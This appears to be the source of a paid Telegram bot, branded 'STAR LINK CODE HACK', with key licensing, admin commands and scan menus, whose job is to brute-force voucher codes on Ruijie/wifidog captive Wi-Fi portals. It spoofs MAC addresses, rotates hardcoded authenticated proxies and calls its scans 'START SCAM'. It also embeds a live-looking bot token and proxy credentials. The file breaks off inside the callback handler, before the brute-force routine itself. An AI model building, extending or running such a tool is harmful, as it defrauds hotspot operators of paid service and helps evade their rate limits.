#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================
#  # Ruijie Voucher Scanner Bot v9.3 ULTRA MAX PRO
#  - Admin: @Myogyi10384 (Auto-Paid)
#  - Forward: @Myogyi10384
#  - uvloop, Asyncio.to_thread PaddleOCR, OCR Caching, Smart Rate-Limit, Strict Double-Check, & Session Isolation
# ==============================================

import os
# Model source check ကို ပိတ်ပြီး cache များကို တိုက်ရိုက်အသုံးပြုရန်
os.environ['PADDLE_PDX_DISABLE_MODEL_SOURCE_CHECK'] = 'True'
os.environ['DISABLE_MODEL_SOURCE_CHECK'] = 'True'

import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import string
import time
import uuid
import threading
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
from paddleocr import PaddleOCR
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

# --- Logging (Must be defined first for logger.info/warning) ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Try importing and setting uvloop for network event loop boost
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# Automatically raise system file descriptor limit (ulimit) for high concurrency
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    desired = 65535
    if soft < desired:
        resource.setrlimit(resource.RLIMIT_NOFILE, (min(desired, hard), hard))
        logger.info(f"Successfully raised ulimit (NOFILE) from {soft} to {min(desired, hard)}")
except Exception as e:
    logger.warning(f"Could not adjust ulimit programmatically: {e}")

# ======================================================
# CONFIGURATION - Admin and Forward = Myogyi10384
# ======================================================
BOT_TOKEN = "9213059063:AAG8ke0-QSCrM9XmmrCvlktJM79-3bGt6bQ"
ADMIN_IDS = ["6130147402"]
ADMIN_NAME = ""
FORWARD_CHANNEL = ""

MAX_CONCURRENT = 3000
BATCH_SIZE = 150
CONNECTION_LIMIT = 8000
CONNECTION_PER_HOST = 4000
TIMEOUT = 10
DB_PATH = "bot_data.db"

PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129"
]
random.shuffle(PROXY_LIST)

# --- Database ---
_db_conn = None
_db_lock = threading.Lock()

def get_db_connection():
    global _db_conn
    with _db_lock:
        if _db_conn is None:
            _db_conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
            _db_conn.execute("PRAGMA journal_mode=WAL")
            _db_conn.execute("PRAGMA synchronous=NORMAL")
            _db_conn.execute("PRAGMA cache_size=10000")
            _db_conn.row_factory = sqlite3.Row
        return _db_conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT, code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_checkpoints (user_id TEXT PRIMARY KEY, mode TEXT, last_code TEXT, start_digit TEXT, timestamp REAL)''')
    conn.commit()
    logger.info("Database initialized")
init_db()

# --- In-memory caches ---
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()
_connector = None

# --- OCR Cache Implementation ---
_ocr_cache = {}
_ocr_cache_lock = threading.Lock()

# --- Proxy helpers ---
_proxy_index = 0
def get_next_proxy():
    if not PROXY_LIST:
        return None
    global _proxy_index
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    if not proxy.startswith(('http://', 'https://')):
        proxy = f"http://{proxy}"
    return proxy

# --- DB Helpers ---
@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    except Exception as e:
        conn.rollback()
        logger.error(f"DB error: {e}")
        raise
    finally:
        pass

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        r = c.fetchone()
        return dict(r) if r else None
def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return json.loads(r[0]) if r else []
def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))
def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.now(timezone.utc).isoformat()))
def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                  (key, user_id, plan, expires_at, code_limit, 0))
def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))
def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))
def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        return {r[0]: dict(r) for r in c.fetchall()}
def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT user_id FROM users")
        return [r[0] for r in c.fetchall()]
def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return bool(r[0]) if r else True
def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (user_id, 1 if enabled else 0))
def db_get_checkpoint(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM scan_checkpoints WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return dict(r) if r else None
def db_save_checkpoint(user_id, mode, last_code, start_digit=None):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO scan_checkpoints (user_id, mode, last_code, start_digit, timestamp) VALUES (?, ?, ?, ?, ?)",
                  (user_id, mode, last_code, start_digit, time.time()))
def db_clear_checkpoint(user_id):
    with get_db_cursor() as c:
        c.execute("DELETE FROM scan_checkpoints WHERE user_id = ?", (user_id,))

def check_key_expiration(expires_at):
    if not expires_at:
        return False
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False
def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1),
             "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()
def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

async def forward_to_channel(message_text, parse_mode=None):
    if not FORWARD_CHANNEL:
        return
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Forward error: {e}")

# ==================== KEYBOARDS ====================
def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "  Proxy OFF" if not proxy_enabled else "  Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "  Proxy ON"
        proxy_callback = "menu_proxy_off"
    keyboard.add(
        InlineKeyboardButton("  PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("  STAR LINK Portal URL        ", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("   Success Codes         ", callback_data="menu_result"),
        InlineKeyboardButton("  Recheck               ", callback_data="menu_recheck"),
        InlineKeyboardButton("  Scan       ", callback_data="menu_stop"),
        InlineKeyboardButton("  Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("  DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("  DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("  DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("  ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("  ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("  ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton(" +  MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton(" +  MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton(" +  MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("  Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("  Random           ", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("  Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("  START SCAM", callback_data="menu_start_scam"), InlineKeyboardButton("  Back", callback_data="menu_back"))
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("  KEY        ", callback_data="menu_enter_key"), InlineKeyboardButton("  Back", callback_data="menu_back"))
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("  Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("  STOP SCAM", callback_data="menu_stop"), InlineKeyboardButton("  Back", callback_data="menu_back"))
    return keyboard

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("  Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("   Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("  List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("  Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("  Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("  Users List", callback_data="admin_users"),
        InlineKeyboardButton("  Back to Menu", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("   30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("   1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("  1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("  7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("  1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("  1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("   Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("  Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("  Back to Admin Panel", callback_data="admin_back"))
    return keyboard

# ==================== BOT INSTANCE ====================
bot = AsyncTeleBot(BOT_TOKEN)

# ==================== HELP COMMAND (Enhanced) ====================
@bot.message_handler(commands=['help'])
async def help_command(message):
    help_text = f"""  Help Guide - {ADMIN_NAME} Bot

  Welcome to STAR LINK CODE HACK Bot!

                    
  **Commands for Users:**
/start   Main Menu
/key [your_key]   Register as PAID USER
/portal [portal_url]   Set your Portal URL (supports wifidog URLs)
/scan [mode]   Start scan (e.g. /scan 6)
/stop   Stop current scan
/result   View your saved success codes
/recheck   Recheck your saved codes
/proxy   Toggle proxy ON/OFF
/help   Show this help

                    
  **Admin Commands:**
/admin   Admin Panel
/genkey [plan] [limit] [user_id]   Generate key for user
/delkey [key]   Delete a key
/sendall [message]   Broadcast to all users
/status   Bot statistics
"""
    await bot.reply_to(message, help_text, parse_mode="Markdown")

# ==================== START COMMAND (Auto-Paid for Admin) ====================
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True
        valid = True
        admin_msg = "         Admin            KEY           "
    else:
        user_info = db_get_user(user_id)
        valid = False
        admin_msg = ""
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                valid = True
                approve[message.chat.id] = True
                paid_users[user_id] = True
    
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    
    if valid:
        welcome_text = f"""  STAR LINK CODE HACK  

  NAME: {user_name}
  USER ID: {user_id}

                 ! 
             PAID USER           
{admin_msg}
   Unlimited Credit                         
  Proxy Status: {proxy_status}

        Menu                              """
    else:
        welcome_text = f"""  STAR LINK CODE HACK  

  NAME: {user_name}
  USER ID: {user_id}

        user ID     registered             

PAID USER                 Menu    PAID USER            
  Admin: {ADMIN_NAME}"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
    await forward_to_channel(f"  New User Started\n\n  Name: {user_name}\n  ID: {user_id}\n{'  ADMIN' if is_admin(user_id) else '  User'}")

# ==================== ADMIN PANEL ====================
@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "      Admin         ")
        return
    text = f"""  {ADMIN_NAME} Panel

Welcome to {ADMIN_NAME} Control Panel!

                                               """
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
    await forward_to_channel(f"  {ADMIN_NAME} Panel Accessed by: {message.from_user.first_name}")

# ==================== KEY COMMAND ====================
@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        await bot.reply_to(message, f"         Admin            KEY           \n\n       PAID USER                    ")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "       KEY               :\n\n/key [your_key]")
        return
    key = args[1].strip()
    key_info = db_get_key(key)
    if not key_info:
        await bot.reply_to(message, "       KEY         ")
        await forward_to_channel(f"  Invalid Key Attempt\n\n  User: {message.from_user.first_name}\n  ID: {user_id}\n  Key: {key}")
        return
    if not check_key_expiration(key_info["expires_at"]):
        await bot.reply_to(message, "       KEY Expired             ")
        return
    db_add_user(user_id, key)
    approve[message.chat.id] = True
    paid_users[user_id] = True
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    await bot.reply_to(
        message,
        f"  PAID USER           \n\nUSER ID: {user_id}\nKEY: {key}\nPlan: {key_info['plan']}\nCode Limit: {key_info['code_limit']}\n\n        Menu                              "
    )
    await forward_to_channel(f"  **New User Registered**\n\n  Name: {message.from_user.first_name}\n  ID: {user_id}\n  Key: {key}\n  Plan: {key_info['plan']}\n  Code Limit: {key_info['code_limit']}", parse_mode="Markdown")

# ==================== GENKEY, DELKEY, SENDALL ====================
@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(
                message,
                "Usage:\n/genkey [plan] [code_limit] [user_id]\n\nPlans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited"
            )
            return
        plan = args[1]
        code_limit = int(args[2])
        user_id = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "  Plan         ")
            return
        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)
        await bot.reply_to(
            message,
            f"  Key Generated Successfully!\n\n  KEY: `{new_key}`\n  USER ID: `{user_id}`\n  PLAN: {plan}\n  CODE LIMIT: {code_limit}\n  EXPIRES: {expiry}\n\nUser   /key {new_key}                       ",
            parse_mode="Markdown"
        )
        await forward_to_channel(f"  **New Key Generated**\n\n  KEY: `{new_key}`\n  USER ID: `{user_id}`\n  PLAN: {plan}\n  CODE LIMIT: {code_limit}\n  EXPIRES: {expiry}", parse_mode="Markdown")
        try:
            await bot.send_message(int(user_id), f"       KEY           \n\n  KEY: `{new_key}`\n  PLAN: {plan}\n  CODE LIMIT: {code_limit}\n\n     KEY     /key {new_key}               ", parse_mode="Markdown")
        except:
            pass
    except Exception as e:
        logger.error(f"genkey error: {e}")
        await bot.reply_to(message, f"  Error: {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey [key]")
            return
        key = args[1]
        key_info = db_get_key(key)
        if not key_info:
            await bot.reply_to(message, f"  Key {key}         ")
            return
        user_info = db_get_user_by_key(key)
        if user_info:
            approve.pop(int(user_info["user_id"]), None)
            paid_users.pop(user_info["user_id"], None)
            user_data.pop(int(user_info["user_id"]), None)
        db_delete_key(key)
        await bot.reply_to(message, f"  Key Deleted\n\n  KEY: {key}\n  USER ID: {user_info['user_id'] if user_info else 'Unknown'}")
        await forward_to_channel(f"   **Key Deleted**\n\n  KEY: {key}\n  USER ID: {user_info['user_id'] if user_info else 'Unknown'}")
    except Exception as e:
        logger.error(f"delkey error: {e}")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    broadcast_text = f"  ADMIN NOTIFICATION\n\n{args[1]}"
    users = db_get_all_users()
    count = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
    await bot.reply_to(message, f"  User {count}                             ")
    await forward_to_channel(f"  Broadcast sent to {count} users\n\n{args[1]}")

# ==================== PORTAL COMMAND ====================
@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "  Portal URL             :\n\n/portal [your_portal_url]")
            return
        url = args[1]
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "  Portal URL                       (Admin bypass).\n\nVOUCHER             Menu           ", reply_markup=get_voucher_keyboard())
        await forward_to_channel(f"  Admin set portal URL: {url}")
        return

    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "       user ID     registered             ")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "  Portal URL             :\n\n/portal [your_portal_url]")
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    await bot.reply_to(message, "  Portal URL                 ...")
    use_proxy = db_get_proxy_setting(user_id)
    
    if await check_session_url(url, use_proxy=use_proxy):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "  Portal URL                       \n\nVOUCHER             Menu           ", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, f"  Portal URL                                               ")

# ==================== OPTIMIZED AIOHTTP NETWORK & TCP CONNECTOR ====================
async def check_session_url(session_url, use_proxy=True):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    proxy = get_next_proxy() if use_proxy and PROXY_LIST else None
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status >= 400:
                    return False
                final_url = str(resp.url)
                keywords = ['sessionId', 'portal', 'maccauth', 'index.html', 'wifidog', 'gw_id', 'gw_sn']
                if any(k in final_url for k in keywords):
                    return True
                content_type = resp.headers.get('content-type', '')
                if 'text/html' in content_type:
                    text = await resp.text()
                    if any(k in text for k in ['sessionId', 'accessCode', 'portal', 'maccauth']):
                        return True
                if resp.status == 200 and ('portal' in final_url or 'auth' in final_url):
                    return True
                return False
    except Exception as e:
        logger.error(f"check_session_url error: {e}")
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        if 'sessionId=' in url:
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', url)
            if match:
                return match.group(1)
        async with session.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as req:
            final_url = str(req.url)
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
            if match:
                return match.group(1)
            content_type = req.headers.get('content-type', '')
            if 'text/html' in content_type:
                text = await req.text()
                html_match = re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]", text)
                if html_match:
                    return html_match.group(1)
                input_match = re.search(r'<input[^>]*name=["\']sessionId["\'][^>]*value=["\']([a-zA-Z0-9]+)["\']', text, re.IGNORECASE)
                if input_match:
                    return input_match.group(1)
            return previous_session_id
    except Exception as e:
        logger.error(f"get_session_id error: {e}")
        return previous_session_id

# ==================== SCAN, STOP, RESULT, RECHECK, PROXY ====================
@bot.message_handler(commands=['scan'])
async def handle_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "VOUCHER            :\n\n/scan 6, 7, 8, engsmall6, engsmall7, engsmall8, engmixed6, engmixed7, engmixed8", reply_markup=get_voucher_keyboard())
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "       user ID     registered             ")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan         Portal URL                       ")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan                            STOP SCAM                              ")
        return
    progress_msg = await bot.send_message(chat_id, "  Scanning VOUCHER Codes...\n\n")
    scan_id = str(uuid.uuid4())
    user_name = message.from_user.first_name or message.from_user.username or "User"
    portal_url = user_data[chat_id].get('session_url', 'Unknown')
    await forward_to_channel(f"  **Scan Started (/scan)**\n\n  **User:** {user_name}\n  **User ID:** `{user_id}`\n  **Mode:** {mode}\n  **Portal URL:**\n`{portal_url}`", parse_mode="Markdown")
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "  Scan                      ", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "           Scan        ", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "       user ID     registered             ")
        return
    results = db_get_results(user_id)
    if results:
        await bot.reply_to(message, f"  Found Codes:\n" + "\n".join(results))
    else:
        await bot.reply_to(message, "                         code           ")

@bot.message_handler(commands=['recheck'])
async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "       user ID     registered             ")
        return
    results = db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "         success code                   ")
        return
    if message.chat.id not in user_data or 'session_url' not in user_data.get(message.chat.id, {}):
        await bot.reply_to(message, "Scan         Portal URL                       ")
        return
    await bot.reply_to(message, f"Success Code                              ")
    session_url_recheck = user_data[message.chat.id]["session_url"]
    recheck_list = []
    for code in results:
        recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    to_show = "\n".join(recheck_list) if recheck_list else "Code                                    success code               "
    await bot.reply_to(message, f"  Rechecked Codes:\n\n{to_show}")
    if recheck_list:
        db_save_results(user_id, recheck_list)

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "      PAID USER         ")
        return
    current = db_get_proxy_setting(user_id)
    new_status = not current
    db_set_proxy_setting(user_id, new_status)
    status_text = "ON" if new_status else "OFF"
    await bot.reply_to(message, f"{' ' if new_status else ' '} Proxy {status_text}               ")

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    if call.data.startswith("admin_"):
        if not is_admin(str(chat_id)):
            await bot.answer_callback_query(call.id, "      Admin         ")
            return
        if call.data == "admin_back":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"  {ADMIN_NAME} Panel\n\n                                               ",
                reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_genkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="  **Select Key Plan**\n\n              Key Plan                ",
                reply_markup=get_admin_genkey_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        plan_map = {
            "admin_gen_30m": "30m", "admin_gen_1h": "1h", "admin_gen_1d": "1d",
            "admin_gen_7d": "7d", "admin_gen_1m": "1m", "admin_gen_1y": "1y", "admin_gen_unlimited": "unlimited"
        }
        if call.data in plan_map:
            plan = plan_map[call.data]
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"  **Selected Plan: {plan}**\n\n                                      :\n\n`/genkey {plan} [code_limit] [user_id]`",
                reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_delkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="   **Delete Key**\n\nKey        :\n\n`/delkey [key]`",
                reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id)
            await listkeys_command(call.message)
            return
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id)
            await stats_command(call.message)
            return
        if call.data == "admin_broadcast":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="  **Broadcast Message**\n\n`/sendall [your_message]`",
                reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id)
            await users_list_command(call.message)
            return
        return

    if call.data in ["menu_proxy_on", "menu_proxy_off"]:
        if user_id not in paid_users and user_id not in approve:
            await bot.answer_callback_query(call.id, "      PAID USER         ")
            return
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        status_text = "ON" if new_status else "OFF"
        emoji = " " if new_status else " "
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=f"  STAR LINK CODE HACK  \n\n  NAME: {user_name}\n  USER ID: {user_id}\n\n  PAID USER - Unlimited Access\n{emoji} Proxy Status: {status_text}",
            reply_markup=get_main_keyboard(user_id))
